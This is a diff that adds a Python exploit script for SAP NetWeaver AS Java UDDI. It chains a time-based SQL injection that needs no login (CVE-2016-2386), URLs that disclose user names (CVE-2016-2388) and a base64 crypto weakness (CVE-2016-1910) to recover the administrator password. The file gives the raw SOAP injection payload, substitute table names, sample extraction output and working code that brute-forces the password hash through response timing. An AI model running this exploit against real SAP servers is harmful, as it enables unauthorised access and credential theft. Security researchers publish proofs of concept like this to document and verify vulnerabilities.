@@ -1,0 +1,144 @@
+#!/usr/bin/env python
+# coding=utf-8
+"""
+Author: Vahagn Vardanyan https://twitter.com/vah_13
+
+Bugs:
+CVE-2016-2386 SQL injection
+CVE-2016-2388 Information disclosure
+CVE-2016-1910 Crypto issue
+
+
+
+Follow HTTP request is a simple PoC for anon time-based SQL injection (CVE-2016-2386) vulnerability in SAP NetWeaver AS Java UDDI 7.11-7.50
+  
+    POST /UDDISecurityService/UDDISecurityImplBean HTTP/1.1
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+	SOAPAction:
+	Content-Type: text/xml;charset=UTF-8
+	Host: nw74:50000
+	Content-Length: 500
+
+	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
+	  <soapenv:Header/>
+	  <soapenv:Body>
+		<sec:deletePermissionById>
+		  <permissionId>1' AND 1=(select COUNT(*) from J2EE_CONFIGENTRY, UME_STRINGS where UME_STRINGS.PID like '%PRIVATE_DATASOURCE.un:Administrator%' and UME_STRINGS.VAL like '%SHA-512%') AND '1'='1</permissionId>
+		</sec:deletePermissionById>
+	  </soapenv:Body>
+	</soapenv:Envelope>
+  
+
+
+
+In SAP test server I have admin user who login is "Administrator" and so I used this payload
+
+        %PRIVATE_DATASOURCE.un:Administrator%
+
+most SAP's using j2ee_admin username for SAP administrator login
+
+        %PRIVATE_DATASOURCE.un:j2ee_admin%
+
+You can get all SAP users login using these URLs (CVE-2016-2388 - information disclosure)
+
+	1)	http:/SAP_IP:SAP_PORT/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat#
+	2)	http:/SAP_IP:SAP_PORT/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Messages#
+
+Instead of J2EE_CONFIGENTRY table you can use this tables
+
+        UME_STRINGS_PERM
+        UME_STRINGS_ACTN
+        BC_DDDBDP
+        BC_COMPVERS
+        TC_WDRR_MRO_LUT
+        TC_WDRR_MRO_FILES
+        T_CHUNK                !!! very big table, if SAP server will not response during 20 seconds then you have SQL injection
+        T_DOMAIN
+        T_SESSION
+        UME_ACL_SUP_PERM
+        UME_ACL_PERM
+        UME_ACL_PERM_MEM
+
+
+An example of a working exploit
+
+	C:\Python27\python.exe SQL_injection_CVE-2016-2386.py --host nw74 --port 50000
+	start to retrieve data from the table UMS_STRINGS from nw74 server using CVE-2016-2386 exploit
+	this may take a few minutes
+	Found {SHA-512, 10000, 24}M
+	Found {SHA-512, 10000, 24}MT
+	Found {SHA-512, 10000, 24}MTI
+	Found {SHA-512, 10000, 24}MTIz
+	Found {SHA-512, 10000, 24}MTIzU
+	Found {SHA-512, 10000, 24}MTIzUV
+	Found {SHA-512, 10000, 24}MTIzUVd
+	Found {SHA-512, 10000, 24}MTIzUVdF
+	Found {SHA-512, 10000, 24}MTIzUVdFY
+	Found {SHA-512, 10000, 24}MTIzUVdFYX
+	Found {SHA-512, 10000, 24}MTIzUVdFYXN
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk8
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88F
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88Fx
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88Fxu
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88FxuY
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88FxuYC
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88FxuYC6
+	Found {SHA-512, 10000, 24}MTIzUVdFYXNk88FxuYC6X
+
+
+And finaly using CVE-2016-1910 (Crypto issue) you can get administrator password in plain text
+
+	base64_decode(MTIzUVdFYXNk88FxuYC6X)=123QWEasdóÁq¹ºX
+
+"""
+import argparse
+import requests
+import string
+
+_magic = "{SHA-512, 10000, 24}"
+_wrong_magic = "{SHA-511, 10000, 24}"
+_xml = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" " \
+       "xmlns:sec=\"http://sap.com/esi/uddi/ejb/security/\">\r\n  <soapenv:Header/>\r\n  <soapenv:Body>\r\n    " \
+       "<sec:deletePermissionById>\r\n      <permissionId>1' AND 1=(select COUNT(*) from J2EE_CONFIGENTRY, " \
+       "UME_STRINGS where UME_STRINGS.PID like '%PRIVATE_DATASOURCE.un:Administrator%' and UME_STRINGS.VAL like '%{" \
+       "0}%') AND '1'='1</permissionId>\r\n    </sec:deletePermissionById>\r\n  </soapenv:Body>\r\n</soapenv:Envelope> "
+host = ""
+port = 0
+_dictionary = string.digits + string.uppercase + string.lowercase
+
+def _get_timeout(_data):
+    return requests.post("http://{0}:{1}/UDDISecurityService/UDDISecurityImplBean".format(host, port),
+                         headers={
+                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 "
+                                           "Firefox/57.0",
+                             "SOAPAction": "",
+                             "Content-Type": "text/xml;charset=UTF-8"
+                         },
+                         data=_xml.format(_data)).elapsed.total_seconds()
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host')
+    parser.add_argument('--port')
+    parser.add_argument('-v')
+
+    args = parser.parse_args()
+    args_dict = vars(args)
+
+    host = args_dict['host']
+    port = args_dict['port']
+
+    print "start to retrieve data from the table UMS_STRINGS from {0} server using CVE-2016-2386 exploit ".format(host)
+    _hash = _magic
+    print "this may take a few minutes"
+    for i in range(24):  # you can change it if like to get full hash
+        for _char in _dictionary:
+            if not (args_dict['v'] is None):
+                print "checking {0}".format(_hash + _char)
+            if _get_timeout(_hash + _char) > 1.300:  # timeout for local SAP server
+                _hash += _char
+                print "Found " + _hash
+                break
